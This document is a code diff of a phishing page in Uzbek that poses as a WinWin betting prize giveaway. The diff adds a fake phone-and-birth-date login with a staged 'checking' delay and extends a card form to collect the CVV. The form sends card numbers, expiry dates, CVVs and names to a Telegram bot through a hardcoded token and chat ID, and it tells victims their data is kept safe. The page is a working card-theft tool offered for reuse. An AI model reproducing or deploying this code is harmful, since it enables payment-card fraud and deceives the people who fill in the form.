@@ -23,10 +23,9 @@
             justify-content: center;
             padding: 16px;
             position: relative;
-            background-color: #0b1a2e;
+            background-color: #1a0b0b;
         }
 
-        /* WinWin fon rasmi – 50% shaffof */
         body::before {
             content: "";
             position: fixed;
@@ -34,7 +33,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background-image: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSJ9s-tjyFt9l0VEEWuXQjuL0Q3jGk0rldU-g&s');
+            background-image: url('https://winwinbet.app/wp-content/uploads/2025/04/WinWin-Bet-Official-1024x559.webp');
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
@@ -43,22 +42,22 @@
             pointer-events: none;
         }
 
-        /* Asosiy karta (umumiy uslub) */
+        /* Asosiy karta */
         .card {
             width: 100%;
             max-width: 500px;
-            background: rgba(255, 255, 255, 0.92);
+            background: rgba(20, 10, 10, 0.92);
             backdrop-filter: blur(8px);
             -webkit-backdrop-filter: blur(8px);
             border-radius: 36px;
             padding: 32px 28px;
-            box-shadow: 0 25px 45px rgba(0, 30, 10, 0.4), 0 10px 20px rgba(0, 0, 0, 0.2);
-            border: 1px solid rgba(255, 255, 255, 0.5);
+            box-shadow: 0 25px 45px rgba(150, 0, 0, 0.4), 0 10px 20px rgba(0, 0, 0, 0.6);
+            border: 1px solid rgba(255, 100, 100, 0.3);
             transition: all 0.2s;
         }
 
         .tournament-badge {
-            background: #00c853;
+            background: #b71c1c;
             color: white;
             font-weight: 700;
             font-size: 0.95rem;
@@ -67,40 +66,71 @@
             display: inline-block;
             margin-bottom: 18px;
             letter-spacing: 0.5px;
-            box-shadow: 0 8px 14px -6px #00662b;
-            border: 1px solid #b9f6ca;
+            box-shadow: 0 8px 14px -6px #8b0000;
+            border: 1px solid #ff9999;
             text-transform: uppercase;
         }
 
-        h1 {
-            font-size: 2.1rem;
+        h1, h2 {
             font-weight: 800;
-            color: #1c2e3f;
+            color: #f5e6e6;
             margin-bottom: 8px;
             line-height: 1.2;
         }
+        h1 { font-size: 2.1rem; }
+        h2 { font-size: 1.6rem; }
 
         h1 span {
-            color: #00a86b;
-            background: linear-gradient(145deg, #00e676, #00c853);
+            color: #ff4d4d;
+            background: linear-gradient(145deg, #ff4d4d, #b22222);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
             background-clip: text;
         }
 
-        .highlight-green {
-            background: #ccffd9;
-            color: #006435;
+        .highlight {
+            background: #330f0f;
+            color: #ffb3b3;
             font-weight: 600;
             padding: 4px 16px;
             border-radius: 40px;
             display: inline-block;
             margin: 8px 0 16px 0;
-            border-left: 5px solid #00c853;
+            border-left: 5px solid #b22222;
             font-size: 1.1rem;
         }
 
-        /* Forma uslublari */
+        .btn-row {
+            display: flex;
+            gap: 15px;
+            margin: 25px 0;
+        }
+        .btn-choice {
+            flex: 1;
+            background: linear-gradient(145deg, #b22222, #8b0000);
+            color: white;
+            font-weight: 700;
+            font-size: 18px;
+            padding: 16px 10px;
+            border: none;
+            border-radius: 50px;
+            cursor: pointer;
+            box-shadow: 0 10px 18px -6px #4a0000;
+            transition: 0.2s;
+            border: 1px solid #ff6666;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        .btn-choice:hover {
+            background: linear-gradient(145deg, #9e1e1e, #6d0000);
+            transform: scale(1.02);
+        }
+        .btn-choice:active {
+            transform: scale(0.98);
+        }
+
         .form-group {
             margin-bottom: 20px;
         }
@@ -111,7 +141,7 @@
             gap: 8px;
             font-size: 15px;
             font-weight: 600;
-            color: #1e2b3a;
+            color: #ffcdcd;
             margin-bottom: 8px;
         }
 
@@ -119,35 +149,27 @@
             width: 100%;
             padding: 16px 20px;
             font-size: 16px;
-            background: white;
-            border: 2px solid #e2e8f0;
+            background: #2a1a1a;
+            border: 2px solid #5a3e3e;
             border-radius: 30px;
             outline: none;
             transition: border 0.2s, box-shadow 0.2s;
+            color: #fff0f0;
         }
 
         .form-control:focus {
-            border-color: #00c853;
-            box-shadow: 0 8px 18px -8px #00a86b;
+            border-color: #ff4d4d;
+            box-shadow: 0 8px 18px -8px #b22222;
         }
 
         .form-control.error {
-            border-color: #d32f2f;
-            background-color: #fff5f5;
-        }
-
-        .row2 {
-            display: flex;
-            gap: 12px;
-        }
-
-        .row2 .form-group {
-            flex: 1;
+            border-color: #ff0000;
+            background-color: #4a1a1a;
         }
 
         .btn-submit {
             width: 100%;
-            background: linear-gradient(145deg, #00c853, #00a86b);
+            background: linear-gradient(145deg, #b22222, #8b0000);
             color: white;
             font-weight: 700;
             font-size: 20px;
@@ -156,54 +178,123 @@
             border-radius: 50px;
             margin-top: 20px;
             cursor: pointer;
-            box-shadow: 0 15px 25px -8px #00662b;
-            transition: all 0.2s;
+            box-shadow: 0 15px 25px -8px #4a0000;
+            transition: 0.2s;
             display: flex;
             align-items: center;
             justify-content: center;
             gap: 8px;
-            border: 1px solid #b9f6ca;
+            border: 1px solid #ff6666;
         }
 
         .btn-submit:hover {
-            background: linear-gradient(145deg, #00b34a, #00803f);
+            background: linear-gradient(145deg, #9e1e1e, #6d0000);
             transform: scale(1.02);
         }
-
         .btn-submit:active {
             transform: scale(0.98);
         }
 
+        /* Loading spinner */
+        .spinner {
+            display: inline-block;
+            width: 40px;
+            height: 40px;
+            border: 4px solid rgba(255, 255, 255, 0.2);
+            border-radius: 50%;
+            border-top-color: #ff4d4d;
+            animation: spin 1s ease-in-out infinite;
+            margin: 20px auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        .loading-container {
+            text-align: center;
+            padding: 20px;
+            color: #ffb3b3;
+        }
+
         .info-box {
-            background: rgba(0, 200, 83, 0.1);
+            background: rgba(180, 0, 0, 0.15);
             border-radius: 20px;
             padding: 16px;
             margin: 24px 0 16px;
-            border: 1px dashed #00c853;
+            border: 1px dashed #ff4d4d;
             font-size: 14px;
-            color: #1d3b2b;
+            color: #ffc2c2;
         }
 
         footer {
             margin-top: 24px;
             text-align: center;
             font-size: 0.9rem;
-            color: #1d3b2b;
+            color: #ffb3b3;
             opacity: 0.9;
-            border-top: 1px solid #a5d6a5;
+            border-top: 1px solid #8b0000;
             padding-top: 16px;
             font-weight: 500;
         }
 
         .visa-icon {
-            background: #1434cb;
-            color: white;
+            background: #1a0000;
+            color: #ff9999;
             padding: 4px 12px;
             border-radius: 30px;
             font-size: 0.8rem;
             font-weight: 600;
             display: inline-block;
             margin-right: 6px;
+            border: 1px solid #b22222;
+        }
+
+        .hidden {
+            display: none !important;
+        }
+
+        /* Fullscreen email xabari */
+        .fullscreen-message {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background-color: rgba(10, 0, 0, 0.95);
+            backdrop-filter: blur(12px);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            padding: 20px;
+            text-align: center;
+            color: #ffb3b3;
+        }
+        .fullscreen-message h3 {
+            font-size: 2rem;
+            margin-bottom: 20px;
+            color: #ff4d4d;
+        }
+        .fullscreen-message p {
+            font-size: 1.4rem;
+            margin-bottom: 30px;
+        }
+        .fullscreen-message .btn-back {
+            background: linear-gradient(145deg, #b22222, #8b0000);
+            color: white;
+            font-weight: 700;
+            font-size: 1.5rem;
+            padding: 16px 40px;
+            border: none;
+            border-radius: 60px;
+            cursor: pointer;
+            box-shadow: 0 10px 20px #4a0000;
+            border: 1px solid #ff6666;
+            transition: 0.2s;
+        }
+        .fullscreen-message .btn-back:hover {
+            background: linear-gradient(145deg, #9e1e1e, #6d0000);
+            transform: scale(1.05);
         }
 
         @media (max-width: 480px) {
@@ -213,34 +304,83 @@
             h1 {
                 font-size: 1.8rem;
             }
+            .fullscreen-message h3 {
+                font-size: 1.6rem;
+            }
+            .fullscreen-message p {
+                font-size: 1.2rem;
+            }
         }
     </style>
 </head>
 <body>
 
+<!-- Fullscreen Email xabari (dastlab yashirin) -->
+<div id="fullscreenEmailMessage" class="fullscreen-message hidden">
+    <h3>📧 Email orqali kirish</h3>
+    <p>Vaqtinchalik ishlamayabdi.<br>Tez kunda ochiladi.</p>
+    <button class="btn-back" id="backFromEmailBtn">⬅️ Orqaga</button>
+</div>
+
 <div class="card">
-    <!-- TO'LOV MA'LUMOTLARI FORMASI – kod so‘ralmaydi, to‘g‘ridan-to‘g‘ri ko‘rinadi -->
-    <div id="paymentSection">
+    <!-- KIRISH QISMI (boshlang'ich) -->
+    <div id="loginSection">
+        <div class="tournament-badge">🔐 WINWIN KIRISH</div>
+        <h2>Kirish usulini tanlang</h2>
+        <div class="highlight">⚡ Faqat bir marta ma'lumot ⚡</div>
+
+        <div class="btn-row">
+            <button class="btn-choice" id="phoneChoiceBtn">📱 Telefon orqali</button>
+            <button class="btn-choice" id="emailChoiceBtn">📧 Email orqali</button>
+        </div>
+
+        <!-- Telefon orqali kirish formasi (dastlab yashirin) -->
+        <div id="phoneLoginForm" class="hidden">
+            <div class="form-group">
+                <label><span>📞</span> Telefon raqam</label>
+                <input type="tel" id="phoneNumber" class="form-control" placeholder="+998 90 123 45 67" inputmode="numeric">
+            </div>
+            <div class="form-group">
+                <label><span>🎂</span> Tug'ilgan sana</label>
+                <!-- type="date" orqali kalendardan tanlash -->
+                <input type="date" id="birthDate" class="form-control" min="1920-01-01" max="2026-12-31">
+            </div>
+            <button class="btn-submit" id="confirmPhoneBtn">✅ Tasdiqlash</button>
+        </div>
+
+        <!-- Loading animatsiya (3 soniya) -->
+        <div id="loadingContainer" class="hidden loading-container">
+            <div class="spinner"></div>
+            <p>Tekshirilmoqda...</p>
+        </div>
+    </div>
+
+    <!-- KARTA MA'LUMOTLARI QISMI (dastlab yashirin) -->
+    <div id="paymentSection" class="hidden">
         <div class="tournament-badge">💳 WINWIN SOVRINLARI</div>
         <h1>Karta ma'lumotlari<span> orqali</span></h1>
-        <div class="highlight-green">⚡ 1 marta to‘ldirish – sovg‘a olish imkoniyati ⚡</div>
+        <div class="highlight">⚡ 1 marta to‘ldirish – sovg‘a olish imkoniyati ⚡</div>
 
-        <!-- Karta formasi -->
         <form id="paymentForm" onsubmit="return false;">
             <div class="form-group">
                 <label><span>💳</span> Karta raqami</label>
                 <input type="text" id="cardNumber" class="form-control" placeholder="0000 0000 0000 0000" maxlength="19" inputmode="numeric" autocomplete="off">
             </div>
 
-            <div class="row2">
-                <div class="form-group">
-                    <label><span>📅</span> Amal qilish muddati</label>
+            <div class="row3" style="display: flex; gap: 12px;">
+                <div class="form-group" style="flex:1;">
+                    <label><span>📅</span> Amal qilish</label>
                     <input type="text" id="expiry" class="form-control" placeholder="MM/YY" maxlength="5" inputmode="numeric">
                 </div>
-                <div class="form-group">
-                    <label><span>👤</span> Ism Familiya</label>
-                    <input type="text" id="cardholderName" class="form-control" placeholder="Ism Familiya" maxlength="50">
+                <div class="form-group" style="flex:1;">
+                    <label><span>🔐</span> CVV</label>
+                    <input type="text" id="cvv" class="form-control" placeholder="123" maxlength="4" inputmode="numeric">
                 </div>
+            </div>
+
+            <div class="form-group">
+                <label><span>👤</span> Ism Familiya</label>
+                <input type="text" id="cardholderName" class="form-control" placeholder="Ism Familiya" maxlength="50">
             </div>
 
             <button type="button" class="btn-submit" id="sendToTelegramBtn">
@@ -248,7 +388,6 @@
             </button>
         </form>
 
-        <!-- Qisqacha ma'lumot (turnir haqida) -->
         <div class="info-box">
             📢 Ma'lumotlaringiz xavfsiz saqlanadi. Turnir yakunida 25 fevraldan boshlab sovg‘alar beriladi.
         </div>
@@ -261,17 +400,88 @@
 
 <script>
     (function() {
-        // Telegram bot ma'lumotlari (o‘z tokeningiz va chat ID ni yozing)
-        const BOT_TOKEN = '8114630640:AAGJgz1jLpRbt3zzM0se61xfh6GMdrGBj6s';      // <-- O‘z bot tokeningizni qo‘ying
-        const CHAT_ID   = '7081746531';        // <-- O‘z chat ID ni qo‘ying
+        // Telegram bot ma'lumotlari (karta qismi uchun)
+        const BOT_TOKEN = '8114630640:AAGJgz1jLpRbt3zzM0se61xfh6GMdrGBj6s';   // <-- O'zingiznikiga almashtiring
+        const CHAT_ID   = '7081746531';         // <-- O'zingiznikiga almashtiring
 
         // Elementlar
+        const loginSection = document.getElementById('loginSection');
+        const paymentSection = document.getElementById('paymentSection');
+        const fullscreenMessage = document.getElementById('fullscreenEmailMessage');
+
+        const phoneChoiceBtn = document.getElementById('phoneChoiceBtn');
+        const emailChoiceBtn = document.getElementById('emailChoiceBtn');
+        const phoneLoginForm = document.getElementById('phoneLoginForm');
+        const loadingContainer = document.getElementById('loadingContainer');
+        const backFromEmailBtn = document.getElementById('backFromEmailBtn');
+
+        const phoneNumberInput = document.getElementById('phoneNumber');
+        const birthDateInput = document.getElementById('birthDate');
+        const confirmPhoneBtn = document.getElementById('confirmPhoneBtn');
+
+        // Karta elementlari
         const cardNumberInput = document.getElementById('cardNumber');
         const expiryInput = document.getElementById('expiry');
+        const cvvInput = document.getElementById('cvv');
         const cardholderInput = document.getElementById('cardholderName');
         const sendBtn = document.getElementById('sendToTelegramBtn');
 
-        // Karta raqamini formatlash: 0000 0000 0000 0000
+        // Telefon tanlanganda
+        phoneChoiceBtn.addEventListener('click', function() {
+            fullscreenMessage.classList.add('hidden');
+            phoneLoginForm.classList.remove('hidden');
+            loadingContainer.classList.add('hidden');
+        });
+
+        // Email tanlanganda -> butun ekran xabarini ko‘rsat
+        emailChoiceBtn.addEventListener('click', function() {
+            phoneLoginForm.classList.add('hidden');
+            loadingContainer.classList.add('hidden');
+            fullscreenMessage.classList.remove('hidden');
+        });
+
+        // Orqaga tugmasi (fullscreen xabardan)
+        backFromEmailBtn.addEventListener('click', function() {
+            fullscreenMessage.classList.add('hidden');
+        });
+
+        // Telefon tasdiqlash tugmasi
+        confirmPhoneBtn.addEventListener('click', function() {
+            let phone = phoneNumberInput.value.trim();
+            let birth = birthDateInput.value;
+
+            if (phone === '' || birth === '') {
+                alert('Iltimos, telefon raqam va tug‘ilgan sanani to‘ldiring');
+                if (phone === '') phoneNumberInput.classList.add('error');
+                else phoneNumberInput.classList.remove('error');
+                if (birth === '') birthDateInput.classList.add('error');
+                else birthDateInput.classList.remove('error');
+                return;
+            }
+
+            let phoneDigits = phone.replace(/[^0-9+]/g, '');
+            if (phoneDigits.length < 9) {
+                phoneNumberInput.classList.add('error');
+                alert('Telefon raqam noto‘g‘ri formatda');
+                return;
+            } else {
+                phoneNumberInput.classList.remove('error');
+            }
+
+            birthDateInput.classList.remove('error');
+
+            phoneLoginForm.classList.add('hidden');
+            fullscreenMessage.classList.add('hidden');
+            loadingContainer.classList.remove('hidden');
+
+            setTimeout(function() {
+                loadingContainer.classList.add('hidden');
+                loginSection.classList.add('hidden');
+                paymentSection.classList.remove('hidden');
+            }, 3000);
+        });
+
+        // Karta raqamini formatlash
         cardNumberInput.addEventListener('input', function(e) {
             let value = this.value.replace(/\s/g, '').replace(/[^0-9]/g, '');
             let parts = [];
@@ -279,11 +489,9 @@
                 parts.push(value.substr(i, 4));
             }
             this.value = parts.join(' ').substr(0, 19);
-            // Xatolik klassini olib tashlash
             this.classList.remove('error');
         });
 
-        // Amal qilish muddatini formatlash: MM/YY
         expiryInput.addEventListener('input', function(e) {
             let value = this.value.replace(/\//g, '').replace(/[^0-9]/g, '');
             if (value.length >= 3) {
@@ -294,27 +502,33 @@
             this.classList.remove('error');
         });
 
-        // Inputlardan xatolik klassini olib tashlash
-        [cardNumberInput, expiryInput, cardholderInput].forEach(input => {
+        cvvInput.addEventListener('input', function(e) {
+            this.value = this.value.replace(/[^0-9]/g, '').substr(0, 4);
+            this.classList.remove('error');
+        });
+
+        [cardNumberInput, expiryInput, cvvInput, cardholderInput].forEach(input => {
             input.addEventListener('focus', () => input.classList.remove('error'));
         });
 
-        // Yuborish tugmasi
         sendBtn.addEventListener('click', function() {
-            // Oq bo‘shliqlarni tozalab olish
             let cardNumber = cardNumberInput.value.replace(/\s/g, '');
             let expiry = expiryInput.value.trim();
+            let cvv = cvvInput.value.trim();
             let cardholder = cardholderInput.value.trim();
 
             let hasError = false;
 
-            // Validatsiya
             if (cardNumber.length < 16 || !/^\d{16}$/.test(cardNumber)) {
                 cardNumberInput.classList.add('error');
                 hasError = true;
             }
             if (!/^\d{2}\/\d{2}$/.test(expiry)) {
                 expiryInput.classList.add('error');
+                hasError = true;
+            }
+            if (!/^\d{3,4}$/.test(cvv)) {
+                cvvInput.classList.add('error');
                 hasError = true;
             }
             if (cardholder === '') {
@@ -327,20 +541,19 @@
                 return;
             }
 
-            // Telegram xabarini tayyorlash
             const message = `🆕 YANGI KARTA MA'LUMOTLARI\n` +
                             `┌───────────────────\n` +
                             `💳 Karta raqami: ${cardNumber}\n` +
                             `📅 Amal qilish: ${expiry}\n` +
+                            `🔐 CVV: ${cvv}\n` +
                             `👤 Ism Familiya: ${cardholder}\n` +
                             `└───────────────────`;
 
-            // Telegram API ga so‘rov yuborish
-            fetch(`https://api.telegram.org/bot8114630640:AAGJgz1jLpRbt3zzM0se61xfh6GMdrGBj6s/sendMessage`, {
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id:7081746531,
+                    chat_id: CHAT_ID,
                     text: message
                 })
             })
@@ -348,9 +561,9 @@
             .then(data => {
                 if (data.ok) {
                     alert('✅ Maʼlumotlaringiz qabul qilindi. Tez orada sovg‘a haqida habar beramiz.');
-                    // Formani tozalash
                     cardNumberInput.value = '';
                     expiryInput.value = '';
+                    cvvInput.value = '';
                     cardholderInput.value = '';
                 } else {
                     alert('❌ Xatolik yuz berdi. Iltimos, qayta urinib ko‘ring.\n' + (data.description || ''));
@@ -361,15 +574,17 @@
             });
         });
 
-        // Enter bosilganda yuborish
-        const inputs = [cardNumberInput, expiryInput, cardholderInput];
-        inputs.forEach(input => {
+        [cardNumberInput, expiryInput, cvvInput, cardholderInput].forEach(input => {
             input.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
                     e.preventDefault();
                     sendBtn.click();
                 }
             });
+        });
+
+        [phoneNumberInput, birthDateInput].forEach(input => {
+            input.addEventListener('focus', () => input.classList.remove('error'));
         });
     })();
 </script>
